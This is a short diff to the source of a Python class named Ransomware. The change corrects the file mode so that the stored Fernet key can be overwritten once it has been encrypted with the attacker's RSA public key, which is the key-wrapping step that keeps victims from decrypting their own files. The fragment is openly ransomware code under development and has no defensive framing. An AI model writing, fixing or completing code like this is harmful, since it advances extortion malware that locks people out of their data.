@@ -55,7 +55,7 @@ class Ransomware:
 		with open('fernet_key.txt','rb') as fk:
 			fernet_key=fk.read() # Store Contents Of The File As A Backup
 
-		with open("fernet_key.txt") as f:
+		with open("fernet_key.txt",'wb') as f:
 			self.public_key=RSA.importKey(open('public.pem').read()) # Import RSA Public Key Of Attacker
 			public_encryptor=PKCS1_OAEP.new(self.public_key) #Return a cipher object PKCS1OAEP_Cipher that can be used to perform PKCS#1 OAEP encryption or decryption
 			enc_fernet_key=public_encryptor.encrypt(fernet_key) #encrypt fernet key with public key
